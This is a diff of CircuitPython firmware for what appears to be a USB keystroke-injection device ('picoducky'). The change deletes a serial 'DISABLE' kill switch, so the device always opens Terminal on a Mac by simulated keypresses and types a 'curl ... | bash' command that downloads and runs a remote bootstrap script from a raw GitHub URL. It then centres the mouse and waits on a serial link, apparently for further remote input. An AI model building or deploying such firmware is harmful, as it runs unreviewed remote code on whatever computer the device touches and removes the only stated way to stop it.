@@ -5,8 +5,6 @@ from adafruit_hid.keyboard import Keyboard  # type: ignore
 from adafruit_hid.keycode import Keycode  # type: ignore
 from adafruit_hid.mouse_abs import Mouse  # type: ignore
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS  # type: ignore
-from adafruit_hid.consumer_control import ConsumerControl  # type: ignore
-from adafruit_hid.consumer_control_code import ConsumerControlCode  # type: ignore
 
 MAGIC_SEQUENCE = b"\x4a\x42\x67\x41"
 BOOTSTRAP_URL = "https://raw.githubusercontent.com/JBlitzar/picoducky/refs/heads/main/cc-src/bootstrap.sh"
@@ -16,7 +14,6 @@ ser = usb_cdc.data
 kbd = Keyboard(usb_hid.devices)
 layout = KeyboardLayoutUS(kbd)
 mouse = Mouse(usb_hid.devices)
-cc = ConsumerControl(usb_hid.devices)
 
 SYM_TO_MOD = {
     "⌘": Keycode.GUI,
@@ -128,29 +125,6 @@ def type_sequence(seq):
 _mx = 0
 _my = 0
 
-# Optional: allow disabling ALL automation via serial before any actions
-def _serial_disable_all(timeout_s: float = 0.5) -> bool:
-    start = time.monotonic()
-    buf = bytearray()
-    while time.monotonic() - start < timeout_s:
-        if ser.connected and ser.in_waiting:
-            buf.extend(ser.read(ser.in_waiting) or b"")
-            if b"DISABLE" in buf:
-                return True
-        time.sleep(0.05)
-    return False
-
-_disabled = _serial_disable_all(0.5)
-
-# Pre-bootstrap: dim screen brightness to minimum unless disabled
-if not _disabled:
-    try:
-        for _ in range(20):
-            cc.send(ConsumerControlCode.BRIGHTNESS_DECREMENT)
-            time.sleep(0.03)
-    except Exception:
-        pass
-
 
 def _send_abs_mouse(x=None, y=None, wheel=0):
     global _mx, _my
@@ -163,31 +137,30 @@ def _send_abs_mouse(x=None, y=None, wheel=0):
     _my = y
 
 
-if not _disabled:
-    # Initial bootstrap: open Terminal and run bootstrap script
-    kbd.press(Keycode.GUI, Keycode.SPACE)
-    kbd.release_all()
-    time.sleep(0.05)
-    layout.write("terminal")
-    time.sleep(0.5)
-    kbd.press(Keycode.ENTER)
-    kbd.release_all()
-    time.sleep(0.25)
-    kbd.press(Keycode.GUI, Keycode.N)
-    kbd.release_all()
-    time.sleep(0.1)
-    # Cache-bust the bootstrap URL so we always fetch the latest script
-    cb = str(int(time.monotonic() * 1000))
-    layout.write(f"curl -sSL '{BOOTSTRAP_URL}?t={cb}' | bash")
-    kbd.press(Keycode.ENTER)
-    kbd.release_all()
-    time.sleep(0.8)
+# Initial bootstrap: open Terminal and run bootstrap script
+kbd.press(Keycode.GUI, Keycode.SPACE)
+kbd.release_all()
+time.sleep(0.05)
+layout.write("terminal")
+time.sleep(0.5)
+kbd.press(Keycode.ENTER)
+kbd.release_all()
+time.sleep(0.25)
+kbd.press(Keycode.GUI, Keycode.N)
+kbd.release_all()
+time.sleep(0.1)
+# Cache-bust the bootstrap URL so we always fetch the latest script
+cb = str(int(time.monotonic() * 1000))
+layout.write(f"curl -sSL '{BOOTSTRAP_URL}?t={cb}' | bash")
+kbd.press(Keycode.ENTER)
+kbd.release_all()
+time.sleep(0.8)
 
-    # Center the mouse
-    mouse.move(16384, 16384, 0)
-    # Track last absolute position so wheel/clicks don't jump to 0,0
-    _mx = 16384
-    _my = 16384
+# Center the mouse
+mouse.move(16384, 16384, 0)
+# Track last absolute position so wheel/clicks don't jump to 0,0
+_mx = 16384
+_my = 16384
 
 # Wait for host to open the serial port
 while not ser.connected:
